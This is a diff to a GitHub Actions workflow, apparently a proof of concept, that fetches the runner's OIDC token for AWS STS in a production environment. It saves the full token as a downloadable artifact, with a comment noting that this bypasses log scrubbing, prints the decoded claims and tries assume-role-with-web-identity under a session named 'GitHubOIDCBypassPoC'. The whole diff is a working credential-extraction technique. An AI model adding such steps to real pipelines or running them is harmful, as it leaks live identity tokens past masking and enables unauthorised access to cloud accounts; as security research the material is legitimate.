@@ -10,19 +10,38 @@ jobs:
     runs-on: ubuntu-latest
     environment: production
     steps:
-      - name: Get OIDC Full JWT and decoded sub claim
+      - name: Get OIDC Full JWT and save to artifact
         run: |
-          FULL_JWT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+          FULL_JWT=$(curl -sS \
+            -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
             "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | jq -r .value)
-          echo "=== FULL JWT (for STS assume-role) ==="
-          echo "$FULL_JWT"
-          echo ""
-          echo "=== DECODED PAYLOAD ==="
+          
+          # Save full token to file (artifact upload bypasses log scrubbing)
+          echo "$FULL_JWT" > /tmp/oidc_token.txt
+          
+          # Print decoded payload
           PAYLOAD=$(echo "$FULL_JWT" | cut -d. -f2)
-          echo "$PAYLOAD" | python3 -c "import sys,base64,json; d=sys.stdin.read().strip(); p=d+'='*(4-len(d)%4); print(json.dumps(json.loads(base64.urlsafe_b64decode(p)),indent=2))"
+          echo "=== DECODED SUB CLAIM ==="
+          echo "$PAYLOAD" | python3 -c "
+          import sys, base64, json
+          d = sys.stdin.read().strip()
+          p = d + '=' * (4 - len(d) % 4)
+          data = json.loads(base64.urlsafe_b64decode(p))
+          print(json.dumps({k: data[k] for k in ['sub','ref','event_name','job_workflow_ref'] if k in data}, indent=2))
+          "
+          
+          # Attempt actual STS assume-role-with-web-identity
+          # Using a trust policy that matches our exact sub claim
           echo ""
-          echo "=== STS ASSUME-ROLE COMMAND ==="
-          echo "aws sts assume-role-with-web-identity \\"
-          echo "  --role-arn arn:aws:iam::ACCOUNT_ID:role/ROLE_NAME \\"
-          echo "  --role-session-name GitHubOIDCBypass \\"
-          echo "  --web-identity-token \"$FULL_JWT\""
+          echo "=== STS ATTEMPT (will fail without matching role but shows the request) ==="
+          aws sts assume-role-with-web-identity \
+            --role-arn "arn:aws:iam::123456789012:role/GitHubOIDCTestRole" \
+            --role-session-name "GitHubOIDCBypassPoC" \
+            --web-identity-token "$FULL_JWT" 2>&1 || true
+
+      - name: Upload OIDC token as artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: oidc-token-poc
+          path: /tmp/oidc_token.txt
+          retention-days: 1
